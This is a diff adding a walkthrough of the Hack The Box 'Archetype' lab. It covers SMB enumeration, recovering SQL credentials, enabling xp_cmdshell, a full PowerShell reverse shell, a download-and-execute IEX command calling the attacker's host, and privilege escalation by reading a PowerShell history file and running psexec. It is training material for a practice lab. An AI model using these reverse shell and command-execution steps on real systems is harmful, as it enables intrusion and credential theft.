@@ -1,0 +1,100 @@
+Archetype is a windows based OS which is a part of Starting point lab machine on Hackthebox.
+Let's connect to the hackthebox network using openvpn.
+
+i. Enumeration:
+===============
+-> Information Gathering/Enumerating is one of the first step we do while doing Penetration testing in the real world or in the lab machines.We will use Nmap
+tool to enumerate the machine.
+
+# nmap -sC -sV -p- -T4 --min-rate=1000 -vvv -oN scan <lab ip>
+=> Let's break all the commands
+-sC        : For default script scan
+-sV        : For service detection
+-T4        : Set timing level higher
+--min-rate : Sends data packets at very high speed
+
+After a while, we got our results where different ports are open but we found two interesting ports of our use.
+They are:
+* 445 for SMB Server[cross-platform file sharing service]
+* 1443 for SQL Server[Related to database]
+
+Now, we will try to know about the SMB server shares:
+
+# smbclient -N -L \\<lab ip>
+=> It will list all the shares of smb server
+-N : flags for No-password
+-L : List the hosts
+
+*** We got an interesting share named backups, Let's have a look into it***
+
+# smbclient -N \\\\\<lab IP>\backups
+=> we got access to the backups share. write following command to know  about files and folders in smb server.
+  smb> dir
+  - List the directory
+  smb> get prod.dtsConfig
+  - Downloads the directory
+  
+ 
+ *** WELL!!!Now we got an password for ARCHETYPE\sql_svc which is M3g4c0rp123***
+ 
+ ii. Gaining Access
+ ==================
+
+To gain access to the SQL Server, We need to install impacket from github:
+Clone the impacket: #git clone https://github.com/SecureAuthCorp/impacket.git
+Change directory  : cd /opt/impacket/examples
+Run the mssqlclient: ./mssqlclient.py ARCHETYPE/sql_svc@<lab ip> -windows-auth
+                  :  SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
+                   -> It will reveal us whether the user has privilege to run the commands.
+                   
+                   This step might be confusing but will be easier when you get the actual concept. We will configure SQL server to run any commands we want
+                   SQL> EXEC sp_configure 'Show Advanced Options',1;
+                   -> It sets the advanced options to 1, so that we can change the configuration setting
+                   
+                   SQL>reconfigure
+                   -> Save the changes
+                   
+                   SQL> EXEC sp_configure 'xp_cmdshell',1;
+                   -> Update the xp_cmdshell to run the commands we want
+                   
+                   SQL> reconfigure
+                   SQL> xp_cmdshell "whoami"
+                   -> Now we can run any command
+                  
+It is a powershell script to get reverse shell back on our machine
+Save the following shell.ps1 file on our attacker machine:
+
+ $client = New-Object System.Net.Sockets.TCPClient("<attacker ip>",443);
+ $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
+ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+ $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+ $stream.Write($sendbyte,0,$sendbyte.Length);
+ $stream.Flush()};
+ $client.Close()
+ 
+ Run the local server on our machine:
+ # python3 -m http.server 80
+ 
+ And at the same time run netcat listener
+ # nc -lvp 443
+ 
+Now, run the following command on SQL server:
+SQL> xp_cmdshell "powershell "IEX(New-Object Net.WebClient).DownloadString(\"http://<localserver ip>/shell.ps1\");"
+
+When we visit our netcat lister, We got a shell.
+*** Go to C:\Users\sql_svc\Desktop******
+Copy the user.txt flag
+
+
+iii. Privilege Escalation
+=========================
+-> After Getting an user shell, it's time to escalate our privilege to root. As we know this is a normal user account, thus it's worth checking the frequently
+access files and commands executed on the powershell.
+# type C:\Users\sql_svc\Appdata\Roaming\Microsoft\Windows\PowerShell\PsReadLIne\ConsoleHost_history.txt
+-> We got an admin password MEGACORP_4dm1n!!
+
+Let's connect to the server using administrator credentials:
+#./opt/impacket/examples/psexec.py administrator@<lab ip>
+-> Enter the password and we got root shell
+
+*****Copy the flag from Desktop folder of administrator********
